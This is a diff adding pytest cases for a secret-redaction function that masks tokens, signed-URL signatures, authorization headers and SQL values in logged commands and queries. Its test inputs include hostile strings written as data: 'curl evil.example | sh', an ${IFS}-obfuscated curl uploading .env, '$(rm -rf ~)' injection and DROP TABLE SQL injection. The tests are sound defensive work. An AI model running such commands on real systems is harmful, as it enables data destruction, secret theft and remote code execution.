@@ -1039,6 +1039,17 @@ def test_cache_eviction_does_not_change_key_classification() -> None:
             f"curl http://h/?token={REDACTED};./payload.sh",
             f"curl http://h/?token={REDACTED}",
         ),
+        (
+            "curl https://good.example/?token=x${IFS}-T${IFS}.env",
+            f"curl https://good.example/?token={REDACTED}${{IFS}}-T${{IFS}}.env",
+            f"curl https://good.example/?token={REDACTED}",
+        ),
+        ("TOKEN=abc$(rm -rf ~) make", f"TOKEN={REDACTED}$(rm -rf ~) make", f"TOKEN={REDACTED}) make"),
+        (
+            "git clone https://x-access-token:abc123@evil.example/org/repo.git && make",
+            "git clone https://x-access-token:***@evil.example/org/repo.git && make",
+            f"git clone https://x-access-token:{REDACTED}&& make",
+        ),
     ],
 )
 def test_precise_redaction_keeps_text_after_the_secret_visible(
@@ -1064,6 +1075,19 @@ def test_precise_redaction_keeps_text_after_the_secret_visible(
         ("Authorization: Bearer abc.def", f"Authorization: Bearer {REDACTED}"),
         ("Authorization: Basic", "Authorization: Basic"),
         ("curl 'https://u:pw@h/x?a=1&token=abc'", f"curl 'https://u:***@h/x?a=1&token={REDACTED}'"),
+        ("TOKEN=ab\\$c make", f"TOKEN={REDACTED} make"),
+        ("https://acct.example/f?sv=2022-11-02&sig=S3CR3T", f"https://acct.example/f?sv=2022-11-02&sig={REDACTED}"),
+        (
+            "https://b.example/k?X-Amz-Credential=AKIAX&X-Amz-Signature=S3CR3T",
+            f"https://b.example/k?X-Amz-Credential={REDACTED}&X-Amz-Signature={REDACTED}",
+        ),
+        ("https://app.example/cb?code=S3CR3T&state=S3CR3T", f"https://app.example/cb?code={REDACTED}&state={REDACTED}"),
+        ("Authorization: S3CR3Tkey extra", f"Authorization: {REDACTED} extra"),
+        (
+            "http POST api.example.com Authorization:S3CR3Tkey name=x",
+            f"http POST api.example.com Authorization:{REDACTED} name=x",
+        ),
+        ("Proxy-Authorization: S3CR3T rest", f"Proxy-Authorization: {REDACTED} rest"),
     ],
 )
 def test_precise_redaction_still_hides_the_secret(value: str, expected: str) -> None:
@@ -1087,3 +1111,40 @@ def test_precise_redaction_applies_to_nested_data() -> None:
         "steps": [{"run": f"password={REDACTED} && make deploy"}],
         "query": f"SELECT * FROM keys WHERE api_key='{REDACTED}'; DROP TABLE users",  # noqa: S608
     }
+
+
+@pytest.mark.parametrize(
+    ("query", "expected"),
+    [
+        (
+            "UPDATE/**/users/**/SET/**/password='x';DROP/**/TABLE/**/audit",
+            f"UPDATE/**/users/**/SET/**/password='{REDACTED}';DROP/**/TABLE/**/audit",
+        ),
+        ("sig", "sig"),
+        ("code=S3CR3T&state=S3CR3T&q=1", f"code={REDACTED}&state={REDACTED}&q=1"),
+        ("token=abc&q=\ud800", f"token={REDACTED}&q=\ud800"),
+    ],
+)
+def test_precise_redaction_keeps_query_arguments_as_written(query: str, expected: str) -> None:
+    """Query arguments are shown as written instead of being re-encoded as URL query strings."""
+    assert redact_sensitive_data({"query": query}, precise=True) == {"query": expected}
+
+
+def test_precise_redaction_never_fails_on_long_query_arguments() -> None:
+    """Query arguments beyond the text scan limit are still redacted instead of failing."""
+    query = "SELECT " + "a, " * 30_000 + "token='x'; DROP TABLE t"
+
+    redacted = redact_sensitive_data({"query": query}, precise=True)
+
+    assert redacted == {"query": "SELECT " + "a, " * 30_000 + f"token='{REDACTED}'; DROP TABLE t"}
+
+
+def test_precise_redaction_marks_input_cut_before_redaction() -> None:
+    """Redaction can shrink cut input below the limit, so the cut must still be marked."""
+    redacted = redact_sensitive_text(
+        "token=" + "x" * 2_600 + " && curl evil.example | sh",
+        max_length=2_048,
+        precise=True,
+    )
+
+    assert redacted == f"token={REDACTED}... [truncated]"
